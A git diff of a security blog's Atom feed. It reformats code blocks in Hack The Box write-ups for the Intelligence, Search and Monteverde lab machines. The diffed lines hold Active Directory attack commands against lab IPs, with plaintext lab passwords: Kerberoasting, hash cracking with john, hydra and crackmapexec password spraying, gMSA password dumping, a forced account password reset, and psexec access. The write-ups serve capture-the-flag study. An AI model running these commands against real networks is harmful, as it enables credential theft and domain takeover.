@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://omnisl4sh.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://omnisl4sh.github.io/" rel="alternate" type="text/html" /><updated>2022-07-02T12:58:57+02:00</updated><id>https://omnisl4sh.github.io/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Windows - Medium] - Intelligence</title><link href="https://omnisl4sh.github.io/2022/07/01/Intelligence.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Intelligence" /><published>2022-07-01T00:00:00+02:00</published><updated>2022-07-01T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/07/01/Intelligence</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/07/01/Intelligence.html"><![CDATA[<p><img src="/assets/Intelligence/Intelligence.png" alt="Search" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-07-03T00:19:18+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Windows - Medium] - Intelligence</title><link href="http://localhost:4000/2022/07/01/Intelligence.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Intelligence" /><published>2022-07-01T00:00:00+02:00</published><updated>2022-07-01T00:00:00+02:00</updated><id>http://localhost:4000/2022/07/01/Intelligence</id><content type="html" xml:base="http://localhost:4000/2022/07/01/Intelligence.html"><![CDATA[<p><img src="/assets/Intelligence/Intelligence.png" alt="Search" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
@@ -116,17 +116,17 @@ Host script results:
 
 <p>Here’s the script:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>foreach($year in (2018 .. 2022)){
-	foreach($month in (1 .. 12)){
-	        if ($month -lt 10){$month = "0$month"}   # if the month's number is less than 10, put a zero before it
-	        foreach($day in (1..31)){
-	                if($day -lt 10){$day = "0$day"}  # if the day's number is less than 10, put a zero before it
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">foreach</span><span class="p">(</span><span class="nv">$year</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="p">(</span><span class="mi">2018</span><span class="w"> </span><span class="o">..</span><span class="w"> </span><span class="mi">2022</span><span class="p">)){</span><span class="w">
+	</span><span class="kr">foreach</span><span class="p">(</span><span class="nv">$month</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="o">..</span><span class="w"> </span><span class="mi">12</span><span class="p">)){</span><span class="w">
+	        </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$month</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="mi">10</span><span class="p">){</span><span class="nv">$month</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"0</span><span class="nv">$month</span><span class="s2">"</span><span class="p">}</span><span class="w">   </span><span class="c"># if the month's number is less than 10, put a zero before it</span><span class="w">
+	        </span><span class="kr">foreach</span><span class="p">(</span><span class="nv">$day</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="o">..</span><span class="mi">31</span><span class="p">)){</span><span class="w">
+	                </span><span class="kr">if</span><span class="p">(</span><span class="nv">$day</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="mi">10</span><span class="p">){</span><span class="nv">$day</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"0</span><span class="nv">$day</span><span class="s2">"</span><span class="p">}</span><span class="w">  </span><span class="c"># if the day's number is less than 10, put a zero before it</span><span class="w">
 
-	                "$year-$month-$day-upload.pdf" &gt;&gt; pdf_name_list.txt # output the generated name into a text file
-	        }
-	}
-}
-</code></pre></div></div>
+	                </span><span class="s2">"</span><span class="nv">$year</span><span class="s2">-</span><span class="nv">$month</span><span class="s2">-</span><span class="nv">$day</span><span class="s2">-upload.pdf"</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="n">pdf_name_list.txt</span><span class="w"> </span><span class="c"># output the generated name into a text file</span><span class="w">
+	        </span><span class="p">}</span><span class="w">
+	</span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
 
 <p>Which works like a charm :D</p>
 
@@ -134,7 +134,7 @@ Host script results:
 
 <p>We create a specific folder for the <strong>PDF</strong>s and then write a quick <strong>bash</strong> loop to download every document it can find. we use <code class="language-plaintext highlighter-rouge">wget</code> with the <code class="language-plaintext highlighter-rouge">-q</code> flag to make it go quietly.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for doc in $(cat pdf_name_list.txt); do wget -q "http://10.10.10.248/documents/$doc"; done
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>doc <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>pdf_name_list.txt<span class="si">)</span><span class="p">;</span> <span class="k">do </span>wget <span class="nt">-q</span> <span class="s2">"http://10.10.10.248/documents/</span><span class="nv">$doc</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span>
 </code></pre></div></div>
 
 <p><img src="/assets/Intelligence/a-lot-of-pdfs.jpg" alt="a-lot-of-pdfs" /></p>
@@ -149,14 +149,14 @@ Host script results:
 
 <p><em>After installing the package,</em> We’re going to use another <strong>bash</strong> script to create the converted text files.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for pdf in $(ls *.pdf); do pdftotext $pdf; done
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>pdf <span class="k">in</span> <span class="si">$(</span><span class="nb">ls</span> <span class="k">*</span>.pdf<span class="si">)</span><span class="p">;</span> <span class="k">do </span>pdftotext <span class="nv">$pdf</span><span class="p">;</span> <span class="k">done</span>
 </code></pre></div></div>
 
 <p>We end up with 99 text files that we need to browse through :D</p>
 
 <p>Time for another script xD</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for text in $(ls *.txt); do echo $text; echo '---------------------'; cat $text; echo 'press any key to continue'; read; done
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>text <span class="k">in</span> <span class="si">$(</span><span class="nb">ls</span> <span class="k">*</span>.txt<span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nv">$text</span><span class="p">;</span> <span class="nb">echo</span> <span class="s1">'---------------------'</span><span class="p">;</span> <span class="nb">cat</span> <span class="nv">$text</span><span class="p">;</span> <span class="nb">echo</span> <span class="s1">'press any key to continue'</span><span class="p">;</span> <span class="nb">read</span><span class="p">;</span> <span class="k">done</span>
 </code></pre></div></div>
 
 <p>This displays the document names and allows you to browse each.</p>
@@ -194,7 +194,7 @@ Host script results:
 
 <p>We couple this with some Shell Fu to create a user list:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for pdf in $(ls *.pdf); do exiftool -creator $pdf | awk -F ': ' '{print $2}'; done | sort -u &gt; userlist.txt
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>pdf <span class="k">in</span> <span class="si">$(</span><span class="nb">ls</span> <span class="k">*</span>.pdf<span class="si">)</span><span class="p">;</span> <span class="k">do </span>exiftool <span class="nt">-creator</span> <span class="nv">$pdf</span> | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s1">': '</span> <span class="s1">'{print $2}'</span><span class="p">;</span> <span class="k">done</span> | <span class="nb">sort</span> <span class="nt">-u</span> <span class="o">&gt;</span> userlist.txt
 </code></pre></div></div>
 
 <p><img src="/assets/Intelligence/exiftool-userlist.jpg" alt="exiftool-userlist" /></p>
@@ -230,32 +230,32 @@ Host script results:
 
 <p>When checking its content:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Check web server status. Scheduled to run every 5min
-Import-Module ActiveDirectory 
-foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
-	try {
-		$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
-		if(.StatusCode -ne 200) {
-			Send-MailMessage -From 'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;' -To 'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;' -Subject "Host: $($record.Name) is down"
-		}
-	}
-	catch {}
-}
-</code></pre></div></div>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check web server status. Scheduled to run every 5min</span><span class="w">
+</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">ActiveDirectory</span><span class="w"> 
+</span><span class="kr">foreach</span><span class="p">(</span><span class="nv">$record</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="s2">"AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="nx">Name</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"web*"</span><span class="p">)</span><span class="w">  </span><span class="p">{</span><span class="w">
+	</span><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+		</span><span class="nv">$request</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="s2">"http://</span><span class="si">$(</span><span class="nv">$record</span><span class="o">.</span><span class="nf">Name</span><span class="si">)</span><span class="s2">"</span><span class="w"> </span><span class="nt">-UseDefaultCredentials</span><span class="w">
+		</span><span class="kr">if</span><span class="p">(</span><span class="o">.</span><span class="nf">StatusCode</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="mi">200</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+			</span><span class="n">Send-MailMessage</span><span class="w"> </span><span class="nt">-From</span><span class="w"> </span><span class="s1">'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;'</span><span class="w"> </span><span class="nt">-To</span><span class="w"> </span><span class="s1">'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;'</span><span class="w"> </span><span class="nt">-Subject</span><span class="w"> </span><span class="s2">"Host: </span><span class="si">$(</span><span class="nv">$record</span><span class="o">.</span><span class="nf">Name</span><span class="si">)</span><span class="s2"> is down"</span><span class="w">
+		</span><span class="p">}</span><span class="w">
+	</span><span class="p">}</span><span class="w">
+	</span><span class="kr">catch</span><span class="w"> </span><span class="p">{}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
 
 <p>We can see that the script:</p>
 <ul>
   <li>Runs every 5 minutes
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Check web server status. Scheduled to run every 5min
-</code></pre></div>    </div>
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check web server status. Scheduled to run every 5min</span><span class="w">
+</span></code></pre></div>    </div>
   </li>
   <li>Looks for <strong>DNS</strong> records that start with <strong>“web”</strong>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*"
-</code></pre></div>    </div>
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ChildItem</span><span class="w"> </span><span class="s2">"AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="nx">Name</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"web*"</span><span class="w">
+</span></code></pre></div>    </div>
   </li>
   <li>Uses the credentials of the user running the script to issue web requests for every record match
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
-</code></pre></div>    </div>
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="s2">"http://</span><span class="si">$(</span><span class="nv">$record</span><span class="o">.</span><span class="nf">Name</span><span class="si">)</span><span class="s2">"</span><span class="w"> </span><span class="nt">-UseDefaultCredentials</span><span class="w">
+</span></code></pre></div>    </div>
   </li>
 </ul>
 
@@ -339,7 +339,7 @@ psexec.py -k -no-pass intelligence.htb/administrator@dc.intelligence.htb
 
 <p><img src="/assets/Intelligence/box-owned.jpg" alt="box-owned" /></p>
 
-<p>Pretty sweet :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Search</title><link href="https://omnisl4sh.github.io/2022/06/28/Search.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Search" /><published>2022-06-28T00:00:00+02:00</published><updated>2022-06-28T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/06/28/Search</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/06/28/Search.html"><![CDATA[<p><img src="/assets/Search/Search.png" alt="Search" /></p>
+<p>Pretty sweet :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Search</title><link href="http://localhost:4000/2022/06/28/Search.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Search" /><published>2022-06-28T00:00:00+02:00</published><updated>2022-06-28T00:00:00+02:00</updated><id>http://localhost:4000/2022/06/28/Search</id><content type="html" xml:base="http://localhost:4000/2022/06/28/Search.html"><![CDATA[<p><img src="/assets/Search/Search.png" alt="Search" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
@@ -494,7 +494,9 @@ Host script results:
 
 <p><strong>Note:</strong> it’s recommended to set your <strong>DNS</strong> server in <code class="language-plaintext highlighter-rouge">/etc/resolv.conf</code> to the box’s IP to make sure things go smoothly when using any of the tools we’re about to use.</p>
 
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">python3 bloodhound.py -d search.htb -dc research.search.htb -u hope.sharp -p 'IsolationIsKey?'</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 bloodhound.py <span class="nt">-d</span> search.htb <span class="nt">-dc</span> research.search.htb <span class="nt">-u</span> hope.sharp <span class="nt">-p</span> <span class="s1">'IsolationIsKey?'</span>
+</code></pre></div></div>
 
 <p><img src="/assets/Search/bloodhound-py.jpg" alt="bloodhound-py" /></p>
 
@@ -511,13 +513,17 @@ Host script results:
 <h3 id="kerberoasting-web_svc">Kerberoasting <code class="language-plaintext highlighter-rouge">web_svc</code></h3>
 <p>we use impacket’s <code class="language-plaintext highlighter-rouge">GetUserSPNs.py</code></p>
 
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">python3 GetUserSPNs.py -debug -request -dc-ip 10.10.11.129 search.htb/hope.sharp:'IsolationIsKey?'</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 GetUserSPNs.py <span class="nt">-debug</span> <span class="nt">-request</span> <span class="nt">-dc-ip</span> 10.10.11.129 search.htb/hope.sharp:<span class="s1">'IsolationIsKey?'</span>
+</code></pre></div></div>
 
 <p><img src="/assets/Search/kerberoasted.jpg" alt="kerberoasted" /></p>
 
 <p>And we crack the password using <code class="language-plaintext highlighter-rouge">john</code></p>
 
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">john web_svc_hash -w=/usr/share/wordlists/rockyou.txt</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john web_svc_hash <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</code></pre></div></div>
 
 <p><img src="/assets/Search/cracked-with-john.jpg" alt="cracked-with-john" /></p>
 
@@ -528,7 +534,9 @@ Host script results:
 
 <p><em>In order to get a the full list of domain users,</em> I use <code class="language-plaintext highlighter-rouge">crackmapexec</code> with the <code class="language-plaintext highlighter-rouge">--users</code> flag.</p>
 
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">crackmapexec smb 10.10.11.129 -u 'web_svc' -p '@3ONEmillionbaby' --users</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.11.129 <span class="nt">-u</span> <span class="s1">'web_svc'</span> <span class="nt">-p</span> <span class="s1">'@3ONEmillionbaby'</span> <span class="nt">--users</span>
+</code></pre></div></div>
 
 <p><img src="/assets/Search/cme-full-userlist.jpg" alt="cme-full-userlist" /></p>
 
@@ -539,7 +547,9 @@ Host script results:
 <h3 id="enumerating-smb-access-for-edgar">Enumerating SMB access for Edgar</h3>
 <p>We use <code class="language-plaintext highlighter-rouge">crackmapexec</code>’s <code class="language-plaintext highlighter-rouge">spider_plus</code> module to get a <em>nicely-formatted</em> <strong>JSON</strong> output for <code class="language-plaintext highlighter-rouge">edgar</code>’s share access.</p>
 
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">crackmapexec smb 10.10.11.129 -u 'Edgar.Jacobs' -p '@3ONEmillionbaby' -M spider_plus</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.11.129 <span class="nt">-u</span> <span class="s1">'Edgar.Jacobs'</span> <span class="nt">-p</span> <span class="s1">'@3ONEmillionbaby'</span> <span class="nt">-M</span> spider_plus
+</code></pre></div></div>
 
 <p>We notice something interesting in the results:</p>
 
@@ -575,7 +585,9 @@ Host script results:
 <h3 id="reading-the-gmsa-password--resetting-tristans-password">Reading the GMSA password &amp; Resetting <code class="language-plaintext highlighter-rouge">tristan</code>’s password</h3>
 <p>We can obtain the <strong>NTLM</strong> hash of the <strong>GMSA</strong> <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code> with a <strong>python</strong> tool called <a href="/assets/Search/https://github.com/micahvandeusen/gMSADumper"><code class="language-plaintext highlighter-rouge">gMSADumper</code></a></p>
 
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">python3 gMSADumper.py -u Sierra.Frye -p '$$49=wide=STRAIGHT=jordan=28$$18' -d search.htb</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 gMSADumper.py <span class="nt">-u</span> Sierra.Frye <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">-d</span> search.htb
+</code></pre></div></div>
 
 <p><img src="/assets/Search/got-gmsa-ntlm.jpg" alt="got-gmsa-ntlm" /></p>
 
@@ -612,31 +624,31 @@ Host script results:
 
 <ol>
   <li>Obtain the <strong>GMSA</strong> password as a secure string. This can be done with the below command:
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$secstringpassword = (ConvertFrom-ADManagedPasswordBlob (get-adserviceaccount -filter * -Properties msDS-ManagedPassword).'msDS-ManagedPassword').SecureCurrentPassword
-</code></pre></div>    </div>
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$secstringpassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertFrom-ADManagedPasswordBlob</span><span class="w"> </span><span class="p">(</span><span class="n">get-adserviceaccount</span><span class="w"> </span><span class="nt">-filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">msDS-ManagedPassword</span><span class="p">)</span><span class="o">.</span><span class="s1">'msDS-ManagedPassword'</span><span class="p">)</span><span class="o">.</span><span class="nf">SecureCurrentPassword</span><span class="w">
+</span></code></pre></div>    </div>
   </li>
   <li>Create a <code class="language-plaintext highlighter-rouge">PSCredential</code> object with both the <strong>GMSA</strong> username and the secure string.
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$cred = New-Object System.Management.Automation.PSCredential BIR-ADFS-GMSA, $secstringpassword
-</code></pre></div>    </div>
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="nx">BIR-ADFS-GMSA</span><span class="p">,</span><span class="w"> </span><span class="nv">$secstringpassword</span><span class="w">
+</span></code></pre></div>    </div>
   </li>
   <li>Execute a password reset command using the created <code class="language-plaintext highlighter-rouge">PSCredential</code>:
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$Script = {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'H@CKEDAGA1N!!' -force)}`
-Invoke-Command -ComputerName 127.0.0.1 -credential $cred -ScriptBlock $Script
-</code></pre></div>    </div>
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$Script</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="n">Set-ADAccountPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">tristan.davies</span><span class="w"> </span><span class="nt">-reset</span><span class="w"> </span><span class="nt">-NewPassword</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="s1">'H@CKEDAGA1N!!'</span><span class="w"> </span><span class="nt">-force</span><span class="p">)}</span><span class="w">
+</span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">127.0.0.1</span><span class="w"> </span><span class="nt">-credential</span><span class="w"> </span><span class="nv">$cred</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="nv">$Script</span><span class="w">
+</span></code></pre></div>    </div>
   </li>
   <li>Create another <code class="language-plaintext highlighter-rouge">PSCredential</code> object but with <code class="language-plaintext highlighter-rouge">tristan</code>’s new password:
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$killercreds = New-Object System.Management.Automation.PSCredential Tristan.Davies, (ConvertTo-SecureString -AsPlainText 'H@CKEDAGA1N!!' -force)`
-</code></pre></div>    </div>
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$killercreds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="nx">Tristan.Davies</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="s1">'H@CKEDAGA1N!!'</span><span class="w"> </span><span class="nt">-force</span><span class="p">)</span><span class="w">
+</span></code></pre></div>    </div>
   </li>
   <li>Execute commands as <code class="language-plaintext highlighter-rouge">tristan</code> using the new credential object:
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Command -ComputerName 127.0.0.1 -credential $killercreds -ScriptBlock {whoami}
-</code></pre></div>    </div>
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">127.0.0.1</span><span class="w"> </span><span class="nt">-credential</span><span class="w"> </span><span class="nv">$killercreds</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="p">{</span><span class="n">whoami</span><span class="p">}</span><span class="w">
+</span></code></pre></div>    </div>
   </li>
 </ol>
 
 <p><img src="/assets/Search/tristan-web-access.jpg" alt="tristan-web-access" /></p>
 
-<p>And this wraps up the path :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Monteverde</title><link href="https://omnisl4sh.github.io/2022/06/24/Monteverde.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Monteverde" /><published>2022-06-24T00:00:00+02:00</published><updated>2022-06-24T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/06/24/Monteverde</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/06/24/Monteverde.html"><![CDATA[<p><img src="/assets/Monteverde/Monteverde.png" alt="Monteverde" /></p>
+<p>And this wraps up the path :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Monteverde</title><link href="http://localhost:4000/2022/06/24/Monteverde.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Monteverde" /><published>2022-06-24T00:00:00+02:00</published><updated>2022-06-24T00:00:00+02:00</updated><id>http://localhost:4000/2022/06/24/Monteverde</id><content type="html" xml:base="http://localhost:4000/2022/06/24/Monteverde.html"><![CDATA[<p><img src="/assets/Monteverde/Monteverde.png" alt="Monteverde" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
@@ -698,7 +710,9 @@ Host script results:
 <h3 id="username-enumeration">Username Enumeration</h3>
 <p><em>Using a tool called</em> <code class="language-plaintext highlighter-rouge">enum4linux-ng</code>, we are able to get a list of usernames via <code class="language-plaintext highlighter-rouge">RPC</code>:</p>
 
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">enum4linx-ng -A 10.10.10.172</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enum4linx-ng <span class="nt">-A</span> 10.10.10.172
+</code></pre></div></div>
 
 <p><img src="/assets/Monteverde/enum4linux-ng-output.jpg" alt="enum4linux-ng-output" /></p>
 
@@ -721,7 +735,9 @@ Host script results:
 
 <p>So we try using the usernames themselves as passwords. We do so using <code class="language-plaintext highlighter-rouge">hydra</code> and we get a hit!</p>
 
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">hydra -e s -L users.txt ldap3://10.10.10.172 -v</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-e</span> s <span class="nt">-L</span> users.txt ldap3://10.10.10.172 <span class="nt">-v</span>
+</code></pre></div></div>
 
 <p>where the <code class="language-plaintext highlighter-rouge">-e</code> flag with the <code class="language-plaintext highlighter-rouge">s</code> argument is the part instructing <code class="language-plaintext highlighter-rouge">hydra</code> to use the same entry for both username and password.</p>
 
@@ -732,7 +748,9 @@ Host script results:
 
 <p>This module does as the name suggests: it <em>recursively</em> spiders <strong>SMB</strong> shares and outputs the results in a temp folder.</p>
 
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">crackmapexec smb 10.10.10.172 -u SABatchJobs -p SABatchJobs -M spider_plus</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.172 <span class="nt">-u</span> SABatchJobs <span class="nt">-p</span> SABatchJobs <span class="nt">-M</span> spider_plus
+</code></pre></div></div>
 
 <p><img src="/assets/Monteverde/cme-spiderplus.jpg" alt="cme-spiderplus" /></p>
 
@@ -742,7 +760,9 @@ Host script results:
 
 <p>We connect to the share with <code class="language-plaintext highlighter-rouge">smbclient</code> and download the file to view its contents:</p>
 
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">smbclient //10.10.10.172/users$ -U SABatchJobs</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient //10.10.10.172/users<span class="nv">$ </span><span class="nt">-U</span> SABatchJobs
+</code></pre></div></div>
 
 <p>and we get a password!</p>
 
@@ -751,7 +771,9 @@ Host script results:
 <h3 id="shell-access-as-mhope">Shell Access as <code class="language-plaintext highlighter-rouge">mhope</code></h3>
 <p><em>After getting this password,</em> we immediately spray it over the domain users. We find that it’s valid and that we have <strong>WinRM</strong> access as well!</p>
 
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">crackmapexec winrm 10.10.10.172 -u users.txt -p '4n0therD4y@n0th3r$' --continue-on-success</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec winrm 10.10.10.172 <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'4n0therD4y@n0th3r$'</span> <span class="nt">--continue-on-success</span>
+</code></pre></div></div>
 
 <p><strong>Note:</strong> we used the <code class="language-plaintext highlighter-rouge">--continue-on-success</code> to be able to take advantage of any password reuse.</p>
 
@@ -759,7 +781,9 @@ Host script results:
 
